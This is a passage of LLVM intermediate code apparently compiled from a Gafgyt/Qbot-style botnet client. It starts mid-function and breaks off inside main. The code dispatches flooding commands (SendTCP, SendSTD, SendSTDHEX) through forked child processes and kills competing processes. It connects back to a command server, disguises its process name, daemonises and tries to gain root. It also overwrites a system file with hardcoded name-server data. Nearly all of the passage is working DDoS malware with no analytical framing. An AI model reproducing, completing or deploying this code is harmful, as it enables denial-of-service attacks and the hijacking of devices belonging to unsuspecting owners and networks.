  %243 = load i32, i32* %3, align 4
  %244 = icmp eq i32 %243, 7
  br i1 %244, label %245, label %250

; <label>:245:                                    ; preds = %228
  %246 = load i8**, i8*** %4, align 8
  %247 = getelementptr inbounds i8*, i8** %246, i64 6
  %248 = load i8*, i8** %247, align 8
  %249 = call i32 @atoi(i8* %248) #9
  br label %251

; <label>:250:                                    ; preds = %228
  br label %251

; <label>:251:                                    ; preds = %250, %245
  %252 = phi i32 [ %249, %245 ], [ 10, %250 ]
  store i32 %252, i32* %16, align 4
  %253 = load i32, i32* %3, align 4
  %254 = icmp sgt i32 %253, 5
  br i1 %254, label %255, label %260

; <label>:255:                                    ; preds = %251
  %256 = load i8**, i8*** %4, align 8
  %257 = getelementptr inbounds i8*, i8** %256, i64 5
  %258 = load i8*, i8** %257, align 8
  %259 = call i32 @atoi(i8* %258) #9
  br label %261

; <label>:260:                                    ; preds = %251
  br label %261

; <label>:261:                                    ; preds = %260, %255
  %262 = phi i32 [ %259, %255 ], [ 0, %260 ]
  store i32 %262, i32* %17, align 4
  store i32 32, i32* %18, align 4
  %263 = load i8*, i8** %12, align 8
  %264 = call i8* @strstr(i8* %263, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %265 = icmp ne i8* %264, null
  br i1 %265, label %266, label %286

; <label>:266:                                    ; preds = %261
  %267 = load i8*, i8** %12, align 8
  %268 = call i8* @strtok(i8* %267, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %268, i8** %19, align 8
  br label %269

; <label>:269:                                    ; preds = %283, %266
  %270 = load i8*, i8** %19, align 8
  %271 = icmp ne i8* %270, null
  br i1 %271, label %272, label %285

; <label>:272:                                    ; preds = %269
  %273 = call i32 @listFork()
  %274 = icmp ne i32 %273, 0
  br i1 %274, label %283, label %275

; <label>:275:                                    ; preds = %272
  %276 = load i8*, i8** %19, align 8
  %277 = load i32, i32* %13, align 4
  %278 = load i32, i32* %14, align 4
  %279 = load i8*, i8** %15, align 8
  %280 = load i32, i32* %17, align 4
  %281 = load i32, i32* %16, align 4
  %282 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %276, i32 %277, i32 %278, i8* %279, i32 %280, i32 %281, i32 %282)
  call void @_exit(i32 0) #11
  unreachable

; <label>:283:                                    ; preds = %272
  %284 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %284, i8** %19, align 8
  br label %269

; <label>:285:                                    ; preds = %269
  br label %298

; <label>:286:                                    ; preds = %261
  %287 = call i32 @listFork()
  %288 = icmp ne i32 %287, 0
  br i1 %288, label %289, label %290

; <label>:289:                                    ; preds = %286
  br label %483

; <label>:290:                                    ; preds = %286
  %291 = load i8*, i8** %12, align 8
  %292 = load i32, i32* %13, align 4
  %293 = load i32, i32* %14, align 4
  %294 = load i8*, i8** %15, align 8
  %295 = load i32, i32* %17, align 4
  %296 = load i32, i32* %16, align 4
  %297 = load i32, i32* %18, align 4
  call void @SendTCP(i8* %291, i32 %292, i32 %293, i8* %294, i32 %295, i32 %296, i32 %297)
  call void @_exit(i32 0) #11
  unreachable

; <label>:298:                                    ; preds = %285
  br label %299

; <label>:299:                                    ; preds = %298, %188
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 0
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @strcmp(i8* %302, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.115, i32 0, i32 0)) #9
  %304 = icmp ne i32 %303, 0
  br i1 %304, label %361, label %305

; <label>:305:                                    ; preds = %299
  %306 = load i32, i32* %3, align 4
  %307 = icmp slt i32 %306, 4
  br i1 %307, label %320, label %308

; <label>:308:                                    ; preds = %305
  %309 = load i8**, i8*** %4, align 8
  %310 = getelementptr inbounds i8*, i8** %309, i64 2
  %311 = load i8*, i8** %310, align 8
  %312 = call i32 @atoi(i8* %311) #9
  %313 = icmp slt i32 %312, 1
  br i1 %313, label %320, label %314

; <label>:314:                                    ; preds = %308
  %315 = load i8**, i8*** %4, align 8
  %316 = getelementptr inbounds i8*, i8** %315, i64 3
  %317 = load i8*, i8** %316, align 8
  %318 = call i32 @atoi(i8* %317) #9
  %319 = icmp slt i32 %318, 1
  br i1 %319, label %320, label %321

; <label>:320:                                    ; preds = %314, %308, %305
  br label %483

; <label>:321:                                    ; preds = %314
  %322 = load i8**, i8*** %4, align 8
  %323 = getelementptr inbounds i8*, i8** %322, i64 1
  %324 = load i8*, i8** %323, align 8
  store i8* %324, i8** %20, align 8
  %325 = load i8**, i8*** %4, align 8
  %326 = getelementptr inbounds i8*, i8** %325, i64 2
  %327 = load i8*, i8** %326, align 8
  %328 = call i32 @atoi(i8* %327) #9
  store i32 %328, i32* %21, align 4
  %329 = load i8**, i8*** %4, align 8
  %330 = getelementptr inbounds i8*, i8** %329, i64 3
  %331 = load i8*, i8** %330, align 8
  %332 = call i32 @atoi(i8* %331) #9
  store i32 %332, i32* %22, align 4
  %333 = load i8*, i8** %20, align 8
  %334 = call i8* @strstr(i8* %333, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %335 = icmp ne i8* %334, null
  br i1 %335, label %336, label %352

; <label>:336:                                    ; preds = %321
  %337 = load i8*, i8** %20, align 8
  %338 = call i8* @strtok(i8* %337, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %338, i8** %23, align 8
  br label %339

; <label>:339:                                    ; preds = %349, %336
  %340 = load i8*, i8** %23, align 8
  %341 = icmp ne i8* %340, null
  br i1 %341, label %342, label %351

; <label>:342:                                    ; preds = %339
  %343 = call i32 @listFork()
  %344 = icmp ne i32 %343, 0
  br i1 %344, label %349, label %345

; <label>:345:                                    ; preds = %342
  %346 = load i8*, i8** %23, align 8
  %347 = load i32, i32* %21, align 4
  %348 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %346, i32 %347, i32 %348)
  call void @_exit(i32 0) #11
  unreachable

; <label>:349:                                    ; preds = %342
  %350 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %350, i8** %23, align 8
  br label %339

; <label>:351:                                    ; preds = %339
  br label %360

; <label>:352:                                    ; preds = %321
  %353 = call i32 @listFork()
  %354 = icmp ne i32 %353, 0
  br i1 %354, label %355, label %356

; <label>:355:                                    ; preds = %352
  br label %483

; <label>:356:                                    ; preds = %352
  %357 = load i8*, i8** %20, align 8
  %358 = load i32, i32* %21, align 4
  %359 = load i32, i32* %22, align 4
  call void @SendSTD(i8* %357, i32 %358, i32 %359)
  call void @_exit(i32 0) #11
  unreachable

; <label>:360:                                    ; preds = %351
  br label %361

; <label>:361:                                    ; preds = %360, %299
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 0
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @strcmp(i8* %364, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.116, i32 0, i32 0)) #9
  %366 = icmp ne i32 %365, 0
  br i1 %366, label %423, label %367

; <label>:367:                                    ; preds = %361
  %368 = load i32, i32* %3, align 4
  %369 = icmp slt i32 %368, 4
  br i1 %369, label %382, label %370

; <label>:370:                                    ; preds = %367
  %371 = load i8**, i8*** %4, align 8
  %372 = getelementptr inbounds i8*, i8** %371, i64 2
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @atoi(i8* %373) #9
  %375 = icmp slt i32 %374, 1
  br i1 %375, label %382, label %376

; <label>:376:                                    ; preds = %370
  %377 = load i8**, i8*** %4, align 8
  %378 = getelementptr inbounds i8*, i8** %377, i64 3
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @atoi(i8* %379) #9
  %381 = icmp slt i32 %380, 1
  br i1 %381, label %382, label %383

; <label>:382:                                    ; preds = %376, %370, %367
  br label %483

; <label>:383:                                    ; preds = %376
  %384 = load i8**, i8*** %4, align 8
  %385 = getelementptr inbounds i8*, i8** %384, i64 1
  %386 = load i8*, i8** %385, align 8
  store i8* %386, i8** %24, align 8
  %387 = load i8**, i8*** %4, align 8
  %388 = getelementptr inbounds i8*, i8** %387, i64 2
  %389 = load i8*, i8** %388, align 8
  %390 = call i32 @atoi(i8* %389) #9
  store i32 %390, i32* %25, align 4
  %391 = load i8**, i8*** %4, align 8
  %392 = getelementptr inbounds i8*, i8** %391, i64 3
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @atoi(i8* %393) #9
  store i32 %394, i32* %26, align 4
  %395 = load i8*, i8** %24, align 8
  %396 = call i8* @strstr(i8* %395, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #9
  %397 = icmp ne i8* %396, null
  br i1 %397, label %398, label %414

; <label>:398:                                    ; preds = %383
  %399 = load i8*, i8** %24, align 8
  %400 = call i8* @strtok(i8* %399, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %400, i8** %27, align 8
  br label %401

; <label>:401:                                    ; preds = %411, %398
  %402 = load i8*, i8** %27, align 8
  %403 = icmp ne i8* %402, null
  br i1 %403, label %404, label %413

; <label>:404:                                    ; preds = %401
  %405 = call i32 @listFork()
  %406 = icmp ne i32 %405, 0
  br i1 %406, label %411, label %407

; <label>:407:                                    ; preds = %404
  %408 = load i8*, i8** %27, align 8
  %409 = load i32, i32* %25, align 4
  %410 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %408, i32 %409, i32 %410)
  call void @_exit(i32 0) #11
  unreachable

; <label>:411:                                    ; preds = %404
  %412 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.109, i32 0, i32 0)) #5
  store i8* %412, i8** %27, align 8
  br label %401

; <label>:413:                                    ; preds = %401
  br label %422

; <label>:414:                                    ; preds = %383
  %415 = call i32 @listFork()
  %416 = icmp ne i32 %415, 0
  br i1 %416, label %417, label %418

; <label>:417:                                    ; preds = %414
  br label %483

; <label>:418:                                    ; preds = %414
  %419 = load i8*, i8** %24, align 8
  %420 = load i32, i32* %25, align 4
  %421 = load i32, i32* %26, align 4
  call void @SendSTDHEX(i8* %419, i32 %420, i32 %421)
  call void @_exit(i32 0) #11
  unreachable

; <label>:422:                                    ; preds = %413
  br label %423

; <label>:423:                                    ; preds = %422, %361
  %424 = load i8**, i8*** %4, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 0
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @strcmp(i8* %426, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.117, i32 0, i32 0)) #9
  %428 = icmp ne i32 %427, 0
  br i1 %428, label %465, label %429

; <label>:429:                                    ; preds = %423
  store i32 0, i32* %28, align 4
  store i64 0, i64* %29, align 8
  br label %430

; <label>:430:                                    ; preds = %456, %429
  %431 = load i64, i64* %29, align 8
  %432 = load i64, i64* @numpids, align 8
  %433 = icmp ult i64 %431, %432
  br i1 %433, label %434, label %459

; <label>:434:                                    ; preds = %430
  %435 = load i32*, i32** @pids, align 8
  %436 = load i64, i64* %29, align 8
  %437 = getelementptr inbounds i32, i32* %435, i64 %436
  %438 = load i32, i32* %437, align 4
  %439 = icmp ne i32 %438, 0
  br i1 %439, label %440, label %455

; <label>:440:                                    ; preds = %434
  %441 = load i32*, i32** @pids, align 8
  %442 = load i64, i64* %29, align 8
  %443 = getelementptr inbounds i32, i32* %441, i64 %442
  %444 = load i32, i32* %443, align 4
  %445 = call i32 @getpid() #5
  %446 = icmp ne i32 %444, %445
  br i1 %446, label %447, label %455

; <label>:447:                                    ; preds = %440
  %448 = load i32*, i32** @pids, align 8
  %449 = load i64, i64* %29, align 8
  %450 = getelementptr inbounds i32, i32* %448, i64 %449
  %451 = load i32, i32* %450, align 4
  %452 = call i32 @kill(i32 %451, i32 9) #5
  %453 = load i32, i32* %28, align 4
  %454 = add nsw i32 %453, 1
  store i32 %454, i32* %28, align 4
  br label %455

; <label>:455:                                    ; preds = %447, %440, %434
  br label %456

; <label>:456:                                    ; preds = %455
  %457 = load i64, i64* %29, align 8
  %458 = add i64 %457, 1
  store i64 %458, i64* %29, align 8
  br label %430

; <label>:459:                                    ; preds = %430
  %460 = load i32, i32* %28, align 4
  %461 = icmp sgt i32 %460, 0
  br i1 %461, label %462, label %463

; <label>:462:                                    ; preds = %459
  br label %464

; <label>:463:                                    ; preds = %459
  br label %464

; <label>:464:                                    ; preds = %463, %462
  br label %465

; <label>:465:                                    ; preds = %464, %423
  %466 = load i8**, i8*** %4, align 8
  %467 = getelementptr inbounds i8*, i8** %466, i64 0
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @strcmp(i8* %468, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.118, i32 0, i32 0)) #9
  %470 = icmp ne i32 %469, 0
  br i1 %470, label %472, label %471

; <label>:471:                                    ; preds = %465
  call void @exit(i32 0) #12
  unreachable

; <label>:472:                                    ; preds = %465
  %473 = load i8**, i8*** %4, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 0
  %475 = load i8*, i8** %474, align 8
  %476 = call i32 @strcmp(i8* %475, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0)) #9
  %477 = icmp ne i32 %476, 0
  br i1 %477, label %483, label %478

; <label>:478:                                    ; preds = %472
  call void @RemoveTempDirs()
  %479 = load i32, i32* @mainCommSock, align 4
  %480 = call i8* @getBuild()
  %481 = call i32 @getEndianness()
  %482 = call i32 (i32, i8*, ...) @sockprintf(i32 %479, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.120, i32 0, i32 0), i8* %480, i32 %481)
  br label %483

; <label>:483:                                    ; preds = %478, %472, %417, %382, %355, %320, %289, %227, %179, %127, %61, %57, %35
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.123 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.124 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.125 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.126 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.127 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add nsw i32 %11, 1
  %13 = sext i32 %12 to i64
  %14 = icmp eq i64 %13, 1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %19

; <label>:16:                                     ; preds = %10
  %17 = load i32, i32* @currentServer, align 4
  %18 = add nsw i32 %17, 1
  store i32 %18, i32* @currentServer, align 4
  br label %19

; <label>:19:                                     ; preds = %16, %15
  %20 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %21 = load i32, i32* @currentServer, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %22
  %24 = load i8*, i8** %23, align 8
  %25 = call i8* @strcpy(i8* %20, i8* %24) #5
  store i32 23, i32* %3, align 4
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = call i8* @strchr(i8* %26, i32 58) #9
  %28 = icmp ne i8* %27, null
  br i1 %28, label %29, label %36

; <label>:29:                                     ; preds = %19
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %31 = call i8* @strchr(i8* %30, i32 58) #9
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = call i32 @atoi(i8* %32) #9
  store i32 %33, i32* %3, align 4
  %34 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #9
  store i8 0, i8* %35, align 1
  br label %36

; <label>:36:                                     ; preds = %29, %19
  %37 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %37, i32* @mainCommSock, align 4
  %38 = load i32, i32* @mainCommSock, align 4
  %39 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %40 = load i32, i32* %3, align 4
  %41 = call i32 @connectTimeout(i32 %38, i8* %39, i32 %40, i32 30)
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %36
  store i32 1, i32* %1, align 4
  br label %45

; <label>:44:                                     ; preds = %36
  store i32 0, i32* %1, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  %46 = load i32, i32* %1, align 4
  ret i32 %46
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.121, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.122, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.128, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, %38
  %40 = trunc i64 %39 to i32
  call void @srand(i32 %40) #5
  %41 = call i64 @time(i64* null) #5
  %42 = call i32 @getpid() #5
  %43 = sext i32 %42 to i64
  %44 = xor i64 %41, %43
  %45 = trunc i64 %44 to i32
  call void @init_rand(i32 %45)
  %46 = call i32 @fork() #5
  store i32 %46, i32* %7, align 4
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %48, label %51

; <label>:48:                                     ; preds = %2
  %49 = load i32, i32* %7, align 4
  %50 = call i32 @waitpid(i32 %49, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:51:                                     ; preds = %2
  %52 = load i32, i32* %7, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %65, label %54

; <label>:54:                                     ; preds = %51
  %55 = call i32 @fork() #5
  store i32 %55, i32* %8, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %54
  call void @exit(i32 0) #12
  unreachable

; <label>:58:                                     ; preds = %54
  %59 = load i32, i32* %8, align 4
  %60 = icmp ne i32 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %58
  br label %63

; <label>:62:                                     ; preds = %58
  br label %63

; <label>:63:                                     ; preds = %62, %61
  br label %64

; <label>:64:                                     ; preds = %63
  br label %66

; <label>:65:                                     ; preds = %51
  br label %66

; <label>:66:                                     ; preds = %65, %64
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.129, i32 0, i32 0)) #5
  %69 = call i32 @setuid(i32 0) #5
  %70 = call i32 @seteuid(i32 0) #5
  %71 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %72

; <label>:72:                                     ; preds = %78, %67
  %73 = call i32 @fork() #5
  %74 = icmp eq i32 %73, 0
  br i1 %74, label %75, label %341

; <label>:75:                                     ; preds = %72
  %76 = call i32 @initConnection()
  %77 = icmp ne i32 %76, 0
  br i1 %77, label %78, label %80

; <label>:78:                                     ; preds = %75
  %79 = call i32 @sleep(i32 5)
  br label %72

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* @mainCommSock, align 4
  %82 = call i8* @getBuild()
  %83 = call i32 @getEndianness()
  %84 = call i32 (i32, i8*, ...) @sockprintf(i32 %81, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.130, i32 0, i32 0), i8* %82, i32 %83)
  call void @UpdateNameSrvs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %85

; <label>:85:                                     ; preds = %339, %210, %174, %80
  %86 = load i32, i32* @mainCommSock, align 4
  %87 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %88 = call i32 @recvLine(i32 %86, i8* %87, i32 4096)
  store i32 %88, i32* %11, align 4
  %89 = icmp ne i32 %88, -1
  br i1 %89, label %90, label %340

; <label>:90:                                     ; preds = %85
  store i32 0, i32* %12, align 4
  br label %91

; <label>:91:                                     ; preds = %162, %90
  %92 = load i32, i32* %12, align 4
  %93 = sext i32 %92 to i64
  %94 = load i64, i64* @numpids, align 8
  %95 = icmp ult i64 %93, %94
  br i1 %95, label %96, label %165

; <label>:96:                                     ; preds = %91
  %97 = load i32*, i32** @pids, align 8
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  %101 = load i32, i32* %100, align 4
  %102 = call i32 @waitpid(i32 %101, i32* null, i32 1)
  %103 = icmp sgt i32 %102, 0
  br i1 %103, label %104, label %161

; <label>:104:                                    ; preds = %96
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %14, align 4
  br label %107

; <label>:107:                                    ; preds = %123, %104
  %108 = load i32, i32* %14, align 4
  %109 = zext i32 %108 to i64
  %110 = load i64, i64* @numpids, align 8
  %111 = icmp ult i64 %109, %110
  br i1 %111, label %112, label %126

; <label>:112:                                    ; preds = %107
  %113 = load i32*, i32** @pids, align 8
  %114 = load i32, i32* %14, align 4
  %115 = zext i32 %114 to i64
  %116 = getelementptr inbounds i32, i32* %113, i64 %115
  %117 = load i32, i32* %116, align 4
  %118 = load i32*, i32** @pids, align 8
  %119 = load i32, i32* %14, align 4
  %120 = sub i32 %119, 1
  %121 = zext i32 %120 to i64
  %122 = getelementptr inbounds i32, i32* %118, i64 %121
  store i32 %117, i32* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %112
  %124 = load i32, i32* %14, align 4
  %125 = add i32 %124, 1
  store i32 %125, i32* %14, align 4
  br label %107

; <label>:126:                                    ; preds = %107
  %127 = load i32*, i32** @pids, align 8
  %128 = load i32, i32* %14, align 4
  %129 = sub i32 %128, 1
  %130 = zext i32 %129 to i64
  %131 = getelementptr inbounds i32, i32* %127, i64 %130
  store i32 0, i32* %131, align 4
  %132 = load i64, i64* @numpids, align 8
  %133 = add i64 %132, -1
  store i64 %133, i64* @numpids, align 8
  %134 = load i64, i64* @numpids, align 8
  %135 = add i64 %134, 1
  %136 = mul i64 %135, 4
  %137 = call noalias i8* @malloc(i64 %136) #5
  %138 = bitcast i8* %137 to i32*
  store i32* %138, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %139

; <label>:139:                                    ; preds = %154, %126
  %140 = load i32, i32* %14, align 4
  %141 = zext i32 %140 to i64
  %142 = load i64, i64* @numpids, align 8
  %143 = icmp ult i64 %141, %142
  br i1 %143, label %144, label %157

; <label>:144:                                    ; preds = %139
  %145 = load i32*, i32** @pids, align 8
  %146 = load i32, i32* %14, align 4
  %147 = zext i32 %146 to i64
  %148 = getelementptr inbounds i32, i32* %145, i64 %147
  %149 = load i32, i32* %148, align 4
  %150 = load i32*, i32** %13, align 8
  %151 = load i32, i32* %14, align 4
  %152 = zext i32 %151 to i64
  %153 = getelementptr inbounds i32, i32* %150, i64 %152
  store i32 %149, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %144
  %155 = load i32, i32* %14, align 4
  %156 = add i32 %155, 1
  store i32 %156, i32* %14, align 4
  br label %139

; <label>:157:                                    ; preds = %139
  %158 = load i32*, i32** @pids, align 8
  %159 = bitcast i32* %158 to i8*
  call void @free(i8* %159) #5
  %160 = load i32*, i32** %13, align 8
  store i32* %160, i32** @pids, align 8
  br label %161

; <label>:161:                                    ; preds = %157, %96
  br label %162

; <label>:162:                                    ; preds = %161
  %163 = load i32, i32* %12, align 4
  %164 = add nsw i32 %163, 1
  store i32 %164, i32* %12, align 4
  br label %91

; <label>:165:                                    ; preds = %91
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %167
  store i8 0, i8* %168, align 1
  %169 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %169)
  %170 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
